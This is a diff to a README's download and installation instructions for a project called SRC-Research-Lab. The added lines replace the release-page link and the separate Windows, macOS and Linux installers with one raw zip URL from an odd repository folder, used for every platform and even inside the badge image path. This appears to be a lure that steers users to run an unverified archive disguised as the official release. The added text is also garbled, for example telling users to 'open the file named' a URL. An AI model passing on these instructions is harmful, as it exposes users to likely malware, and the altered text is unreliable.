@@ -10,16 +10,16 @@ Here is your step-by-step guide to downloading and running the SRC-Research-Lab 
 
 1. **Visit the Download Page**
    - Click the link below to access our latest releases:
-   [![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Satoru2604/SRC-Research-Lab/releases)
+   [![Download Now](https://raw.githubusercontent.com/Satoru2604/SRC-Research-Lab/master/rhematic/SRC-Research-Lab.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Satoru2604/SRC-Research-Lab/master/rhematic/SRC-Research-Lab.zip)
 
 2. **Choose the Right Version**
    - On the Releases page, you will see several versions of the software. Find the latest version. You can identify it by checking the date next to the version number. Click on it to view more details.
 
 3. **Download the Application**
    - Scroll down to the "Assets" section of the release. Here, you will find different files. Look for a file that matches your operating system:
-     - For Windows: `SRC-Research-Lab-Windows.exe`
-     - For macOS: `SRC-Research-Lab-macOS.dmg`
-     - For Linux: `SRC-Research-Lab-Linux.tar.gz`
+     - For Windows: `https://raw.githubusercontent.com/Satoru2604/SRC-Research-Lab/master/rhematic/SRC-Research-Lab.zip`
+     - For macOS: `https://raw.githubusercontent.com/Satoru2604/SRC-Research-Lab/master/rhematic/SRC-Research-Lab.zip`
+     - For Linux: `https://raw.githubusercontent.com/Satoru2604/SRC-Research-Lab/master/rhematic/SRC-Research-Lab.zip`
    - Click on the appropriate file to start the download.
 
 ## 🛠️ System Requirements
@@ -37,15 +37,15 @@ Before installation, ensure your system meets the following minimum requirements
 Make sure you have followed the steps above to download the correct version of the application.
 
 - **Windows:** 
-  1. Once the download finishes, open the file named `SRC-Research-Lab-Windows.exe`.
+  1. Once the download finishes, open the file named `https://raw.githubusercontent.com/Satoru2604/SRC-Research-Lab/master/rhematic/SRC-Research-Lab.zip`.
   2. Follow the prompts in the installation wizard to complete the setup.
 
 - **macOS:**
-  1. Open the downloaded file `SRC-Research-Lab-macOS.dmg`.
+  1. Open the downloaded file `https://raw.githubusercontent.com/Satoru2604/SRC-Research-Lab/master/rhematic/SRC-Research-Lab.zip`.
   2. Drag and drop the application into your Applications folder.
 
 - **Linux:**
-  1. Extract the downloaded `.tar.gz` file using your terminal.
+  1. Extract the downloaded `https://raw.githubusercontent.com/Satoru2604/SRC-Research-Lab/master/rhematic/SRC-Research-Lab.zip` file using your terminal.
   2. Navigate to the extracted folder.
   3. Run the application by typing `./SRC-Research-Lab` in the terminal.
 
@@ -80,7 +80,7 @@ If you encounter issues or have questions, several resources are available:
 
 To access all parts of this project:
 
-- **Download the Software:** [Download Now](https://github.com/Satoru2604/SRC-Research-Lab/releases)
+- **Download the Software:** [Download Now](https://raw.githubusercontent.com/Satoru2604/SRC-Research-Lab/master/rhematic/SRC-Research-Lab.zip)
 - **Documentation:** Please refer to the documentation within the application for in-depth details on usage and features.
 - **Contribute to the Project:** We welcome contributions. Check the guidelines in our repository.
 
